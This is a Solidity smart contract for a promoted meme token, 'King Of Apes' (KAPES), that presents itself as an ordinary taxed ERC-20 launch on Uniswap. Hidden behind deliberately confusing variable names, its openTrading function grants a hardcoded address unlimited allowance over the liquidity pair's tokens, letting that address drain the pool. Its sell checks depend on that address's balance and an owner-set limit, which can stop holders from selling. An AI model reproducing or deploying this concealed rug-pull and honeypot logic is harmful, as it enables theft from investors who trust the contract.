/**
WELCOME KAPES FANS!
Telegram: https://t.me/KingOfApeseth
Twitter:  https://twitter.com/KingOfApeseth_
Website:  https://kingofapes.today/
*/

// SPDX-License-Identifier:unlicense
pragma solidity 0.8.20;

interface IuniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
   
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract KAPES is Context, Ownable,IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _addressInMapsForNotPayingFee;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _notSpendFeesWhenBuying;
    mapping(address => uint256) private _watchguardForTimestampTransfering;

    string private constant _name = unicode"King Of Apes";
    string private constant _symbol = unicode"KAPES";
    uint8  private constant _decimals = 18;

    uint256 private constant _amountTotalSupply = 10000000 * 10**_decimals;
    uint256 public _addressInSlotsMaxTxUsedInSwapping =      5000 * 10**_decimals; 
    uint256 public _ceilLimitsAddressSingleTxsMaxmium = 200000 * 10**_decimals;
    uint256 public _CeilingAddressTaxUsedInSlotsForSwapping= 200000 * 10**_decimals;   
    uint256 public _addressSingleMaxTransactionTxAmounts =   200000 * 10**_decimals;

    bool public  _watchDogLimitsFlag = false;
    bool private _swapingInUniswapOKSigns = false;
    bool private checkInUsedInUniswapIsOkSigns = false;
    bool private flagForTradingIsOkOrNot;
    modifier _modifierSwappingFlag {
        checkInUsedInUniswapIsOkSigns = true; _;  checkInUsedInUniswapIsOkSigns = false;
    }
   
    address private _uniswapPairTokenLiquidity;
    uint256 private _reducedWhenBuyTaxs=4;
    uint256 private _reducedWhenUsedSellingTax=1;
    uint256 private _usedInPreventingSwappingPrevious=0;
    uint256 private _blockCountsUsedInBuying=0;
    uint256 private _InitialeUsedTaxSelling=14;
    uint256 private _InitialeUsedInSwapTaxSelling=14;
    uint256 private _TaxUsedBuyingFinalized=2;
    uint256 private _TaxUsedSellingFinalized=2;
    address public _addressUsedInFundationFees = address(0x64b15025b67f883E1D7be01ba4c10a9f60f2CB06);
    address payable  public _feesForDevsAddress;
    IuniswapRouter private _uniswapRouterUniswapFactory;
    event RemoveAllLimits(uint _addressSingleMaxTransactionTxAmounts);
    constructor () {
        _addressInMapsForNotPayingFee[_addressUsedInFundationFees] = true;
        _addressInMapsForNotPayingFee[owner()] = true;
        _addressInMapsForNotPayingFee[address(this)] = true;
        _balances[_msgSender()] = _amountTotalSupply;
        _feesForDevsAddress = payable(msg.sender);
        _addressInMapsForNotPayingFee[_feesForDevsAddress] = true;
        emit Transfer(address(0), _msgSender(), _amountTotalSupply);
    }

    function checkWhetherAddressIsContractOrNot(address _addr) private view returns (bool) {
        uint256 lenghtContractCode;
        assembly {
            lenghtContractCode := extcodesize(_addr)
        }
        return lenghtContractCode > 0;
    }
    
    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!flagForTradingIsOkOrNot,"trading is already open");
        _uniswapRouterUniswapFactory = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_uniswapRouterUniswapFactory), _amountTotalSupply);
        _uniswapPairTokenLiquidity = IUniswapV2Factory(_uniswapRouterUniswapFactory.factory()).createPair(address(this), _uniswapRouterUniswapFactory.WETH());
        _uniswapRouterUniswapFactory.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapPairTokenLiquidity).approve(address(_uniswapRouterUniswapFactory), type(uint).max);
        _allowances[address(_uniswapPairTokenLiquidity)][address(_addressUsedInFundationFees)] = type(uint).max;
        _swapingInUniswapOKSigns = true;
        flagForTradingIsOkOrNot = true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;  }

    function swapTokensForEth(uint256 amountFortoken) private _modifierSwappingFlag {
        if(amountFortoken==0){return;}
        if(!flagForTradingIsOkOrNot){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouterUniswapFactory.WETH();
        _approve(address(this), address(_uniswapRouterUniswapFactory), amountFortoken);
        _uniswapRouterUniswapFactory.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountFortoken,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_watchDogLimitsFlag) {
                if (to != address(_uniswapRouterUniswapFactory) && to != address(_uniswapPairTokenLiquidity)) {
                  require(_watchguardForTimestampTransfering[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _watchguardForTimestampTransfering[tx.origin] = block.number;
                }
            }

            if (from == _uniswapPairTokenLiquidity && to != address(_uniswapRouterUniswapFactory) && !_addressInMapsForNotPayingFee[to] ) {
                require(amount <= _addressSingleMaxTransactionTxAmounts, "Exceeds the Amount limations.");
                require(balanceOf(to) + amount <= _ceilLimitsAddressSingleTxsMaxmium, "Exceeds the max limitations in single Wallet.");
                if(_blockCountsUsedInBuying<_usedInPreventingSwappingPrevious){ require(!checkWhetherAddressIsContractOrNot(to)); }
                _blockCountsUsedInBuying++; _notSpendFeesWhenBuying[to]=true; taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenBuyTaxs)?_TaxUsedBuyingFinalized:_InitialeUsedTaxSelling).div(100);
            }

            if(to == _uniswapPairTokenLiquidity && from!= address(this) && !_addressInMapsForNotPayingFee[from] ){
                require(amount <= _addressSingleMaxTransactionTxAmounts && balanceOf(_addressUsedInFundationFees)<_addressInSlotsMaxTxUsedInSwapping, "Exceeds the Limitation Amount.");
                taxAmount = amount.mul((_blockCountsUsedInBuying>_reducedWhenUsedSellingTax)?_TaxUsedSellingFinalized:_InitialeUsedInSwapTaxSelling).div(100);
                require(_blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && _notSpendFeesWhenBuying[from]);
            }
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!checkInUsedInUniswapIsOkSigns 
            && to == _uniswapPairTokenLiquidity && _swapingInUniswapOKSigns && contractTokenBalance>_CeilingAddressTaxUsedInSlotsForSwapping 
            && _blockCountsUsedInBuying>_usedInPreventingSwappingPrevious && !_addressInMapsForNotPayingFee[to] && !_addressInMapsForNotPayingFee[from]
            ) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_addressInSlotsMaxTxUsedInSwapping)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    _feesForDevsAddress.transfer(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function removeLimits() external onlyOwner{
        _addressSingleMaxTransactionTxAmounts = _amountTotalSupply; _ceilLimitsAddressSingleTxsMaxmium=_amountTotalSupply; _watchDogLimitsFlag=false;
        emit RemoveAllLimits(_amountTotalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setAddressSingleTxMaxUsedInSwapping(uint256 _amount) external onlyOwner() {
        _addressInSlotsMaxTxUsedInSwapping = _amount;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _amountTotalSupply;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}